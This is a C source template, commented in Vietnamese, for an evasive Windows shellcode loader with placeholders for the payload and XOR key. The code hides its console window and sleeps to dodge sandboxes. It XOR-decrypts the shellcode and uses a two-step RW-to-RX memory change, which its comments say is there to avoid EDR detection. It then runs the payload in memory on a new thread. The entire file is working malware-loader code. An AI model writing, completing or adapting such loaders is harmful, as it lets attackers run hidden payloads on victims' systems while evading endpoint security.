#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char payload[] = { %SHELLCODE% };
unsigned char key[] = "%KEY%";

int main() {
    // Tàng hình: Giấu Console Window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Kỹ thuật Anti-Heuristics: Sleep chống Sandbox
    Sleep(2000);

    // XOR Decryption
    int payload_len = sizeof(payload);
    int key_len = sizeof(key) - 1;
    for (int i = 0; i < payload_len; i++) {
        payload[i] = payload[i] ^ key[i % key_len];
    }

    // [AUDIT-FIX] Two-stage memory allocation (RW → RX via VirtualProtect)
    // Tránh RWX allocation — một trong những EDR detection indicator hàng đầu
    // Stage 1: Allocate RW memory (read-write, không execute)
    void *exec = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec != NULL) {
        // Stage 2: Copy Decrypted Shellcode vào RW memory
        RtlMoveMemory(exec, payload, payload_len);
        
        // Stage 3: Chuyển quyền từ RW → RX (read-execute, bỏ write)
        // Điều này tránh tạo vùng nhớ RWX — pattern bị hầu hết EDR flag
        DWORD oldProtect;
        VirtualProtect(exec, payload_len, PAGE_EXECUTE_READ, &oldProtect);
        
        // Tạo thread mới để chạy ẩn danh in-memory
        HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
        WaitForSingleObject(th, INFINITE);
    }
    
    return 0;
}
